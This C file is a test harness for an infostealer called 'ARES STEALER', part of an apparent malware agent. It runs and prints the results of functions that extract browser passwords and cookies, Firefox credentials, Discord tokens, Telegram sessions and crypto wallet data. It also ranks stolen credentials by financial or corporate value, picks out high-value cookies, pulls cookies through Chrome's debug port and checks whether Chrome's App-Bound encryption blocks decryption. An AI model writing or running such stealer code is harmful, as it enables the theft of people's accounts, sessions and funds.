/*
 * ARES STEALER — Test Harness
 * Only tests stealer functions, no C2/persistence/injection
 * Run: build\stealer_test.exe
 */
#include "agent/native/ares_agent.h"
#include <stdio.h>
#include <string.h>
#include <windows.h>
#include <shlobj.h>

/* Stubs for functions not needed in test */
char g_bot_id_global[64] = "test";

int main(void)
{
    printf("\n");
    printf("========================================\n");
    printf("  ARES STEALER TEST HARNESS\n");
    printf("  Testing credential extraction...\n");
    printf("========================================\n\n");

    /* ── Test 1: Chrome/Edge/Brave Passwords ── */
    printf("[1] Chrome/Edge/Brave Passwords...\n");
    DECRYPTED_CRED* creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200 * sizeof(DECRYPTED_CRED));
    int cred_count = Ares_StealChromeCreds(creds, 200);
    printf("    Found: %d credentials\n", cred_count);
    for (int i = 0; i < cred_count && i < 10; i++) {
        printf("    [%d] %s | %s | %s | status=%s | browser=%s/%s\n",
            i+1, creds[i].url, creds[i].username,
            creds[i].decrypt_status[0] == 'o' ? "***decrypted***" : creds[i].password,
            creds[i].decrypt_status, creds[i].browser, creds[i].profile);
    }
    if (cred_count > 10) printf("    ... and %d more\n", cred_count - 10);
    HeapFree(GetProcessHeap(), 0, creds);

    /* ── Test 2: Chrome/Edge/Brave Cookies ── */
    printf("\n[2] Chrome/Edge/Brave Cookies...\n");
    STOLEN_COOKIE* cookies = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(STOLEN_COOKIE));
    int cookie_count = Ares_StealChromeCookies(cookies, 500);
    printf("    Found: %d cookies\n", cookie_count);
    for (int i = 0; i < cookie_count && i < 10; i++) {
        printf("    [%d] %s | %s | value_len=%d | secure=%d httponly=%d\n",
            i+1, cookies[i].host, cookies[i].name,
            (int)strlen(cookies[i].value), cookies[i].secure, cookies[i].httponly);
    }
    if (cookie_count > 10) printf("    ... and %d more\n", cookie_count - 10);
    HeapFree(GetProcessHeap(), 0, cookies);

    /* ── Test 3: Firefox Passwords ── */
    printf("\n[3] Firefox Passwords...\n");
    DECRYPTED_CRED* ff_creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 100 * sizeof(DECRYPTED_CRED));
    int ff_count = Ares_StealFirefoxCreds(ff_creds, 100);
    printf("    Found: %d Firefox credentials\n", ff_count);
    for (int i = 0; i < ff_count && i < 5; i++) {
        printf("    [%d] %s | user_enc_len=%d | pass_enc_len=%d | profile=%s\n",
            i+1, ff_creds[i].url, (int)strlen(ff_creds[i].username),
            (int)strlen(ff_creds[i].password), ff_creds[i].profile);
    }
    HeapFree(GetProcessHeap(), 0, ff_creds);

    /* ── Test 4: Discord Tokens ── */
    printf("\n[4] Discord Tokens...\n");
    STOLEN_TOKEN* tokens = (STOLEN_TOKEN*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 20 * sizeof(STOLEN_TOKEN));
    int token_count = Ares_StealDiscordTokens(tokens, 20);
    printf("    Found: %d Discord tokens\n", token_count);
    for (int i = 0; i < token_count && i < 5; i++) {
        printf("    [%d] %s | type=%s | len=%d | src=%s\n",
            i+1, tokens[i].app, tokens[i].type, tokens[i].data_len, tokens[i].path);
    }
    HeapFree(GetProcessHeap(), 0, tokens);

    /* ── Test 5: Telegram Sessions ── */
    printf("\n[5] Telegram Sessions...\n");
    STOLEN_TOKEN* tg_tokens = (STOLEN_TOKEN*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 10 * sizeof(STOLEN_TOKEN));
    int tg_count = Ares_StealTelegramSession(tg_tokens, 10);
    printf("    Found: %d Telegram session files\n", tg_count);
    for (int i = 0; i < tg_count; i++) {
        printf("    [%d] %s | %s | size=%d bytes | path=%s\n",
            i+1, tg_tokens[i].app, tg_tokens[i].type, tg_tokens[i].data_len, tg_tokens[i].path);
    }
    HeapFree(GetProcessHeap(), 0, tg_tokens);

    /* ── Test 6: Crypto Wallets ── */
    printf("\n[6] Crypto Wallets...\n");
    STOLEN_WALLET* wallets = (STOLEN_WALLET*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 20 * sizeof(STOLEN_WALLET));
    int wallet_count = Ares_StealWallets(wallets, 20);
    printf("    Found: %d wallet extensions\n", wallet_count);
    for (int i = 0; i < wallet_count; i++) {
        printf("    [%d] %s | browser=%s | data=%d bytes\n",
            i+1, wallets[i].extension_name, wallets[i].browser, wallets[i].data_len);
    }
    HeapFree(GetProcessHeap(), 0, wallets);

    /* ── Summary ── */
    printf("\n========================================\n");
    printf("  SUMMARY\n");
    printf("  Passwords (Chromium): %d\n", cred_count);
    printf("  Passwords (Firefox):  %d\n", ff_count);
    printf("  Cookies:              %d\n", cookie_count);
    printf("  Discord tokens:       %d\n", token_count);
    printf("  Telegram sessions:    %d\n", tg_count);
    printf("  Crypto wallets:       %d\n", wallet_count);
    printf("  TOTAL artifacts:      %d\n", cred_count + ff_count + cookie_count + token_count + tg_count + wallet_count);

    /* ── Credential Classification ── */
    printf("\n[7] Credential Value Analysis...\n");
    DECRYPTED_CRED* creds2 = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 200 * sizeof(DECRYPTED_CRED));
    int c2 = Ares_StealChromeCreds(creds2, 200);
    CRED_SCORE score;
    Ares_ClassifyCredentials(creds2, c2, &score);
    printf("    Financial:     %d targets (banking/crypto/payment)\n", score.financial);
    printf("    Corporate:     %d targets (cloud/vpn/devtools)\n", score.corporate);
    printf("    Social:        %d targets (email/social media)\n", score.social);
    printf("    Entertainment: %d targets (gaming/streaming)\n", score.entertainment);
    printf("    Total score:   %d\n", score.total);
    HeapFree(GetProcessHeap(), 0, creds2);

    /* ── High-value cookies ── */
    printf("\n[8] High-Value Cookies...\n");
    STOLEN_COOKIE* ck2 = (STOLEN_COOKIE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 500 * sizeof(STOLEN_COOKIE));
    int ck2_count = Ares_StealChromeCookies(ck2, 500);
    int hv = 0;
    for (int i = 0; i < ck2_count; i++) {
        if (Ares_IsCookieHighValue(&ck2[i])) {
            if (hv < 10) printf("    [HV] %s | %s\n", ck2[i].host, ck2[i].name);
            hv++;
        }
    }
    printf("    High-value cookies: %d / %d total\n", hv, ck2_count);
    HeapFree(GetProcessHeap(), 0, ck2);

    /* ── CDP Chrome Debug Port ── */
    printf("\n[9] Chrome CDP Debug Port...\n");
    STOLEN_COOKIE cdp_cookies[100];
    int cdp_count = Ares_CDP_StealCookies(cdp_cookies, 100);
    printf("    CDP cookies extracted: %d\n", cdp_count);

    /* ── v20 Detection ── */
    printf("\n[10] Chrome Version Detection...\n");
    if (cred_count > 0) {
        DECRYPTED_CRED* test_creds = (DECRYPTED_CRED*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 5 * sizeof(DECRYPTED_CRED));
        int tc = Ares_StealChromeCreds(test_creds, 5);
        if (tc > 0 && strcmp(test_creds[0].decrypt_status, "v20_blocked") == 0)
            printf("    Chrome v20 App-Bound ACTIVE — passwords encrypted\n");
        else if (tc > 0 && strcmp(test_creds[0].decrypt_status, "ok") == 0)
            printf("    Chrome LEGACY — passwords decrypted successfully\n");
        else
            printf("    Chrome status: %s\n", tc > 0 ? test_creds[0].decrypt_status : "no_creds");
        HeapFree(GetProcessHeap(), 0, test_creds);
    }

    printf("\n========================================\n");

    return 0;
}
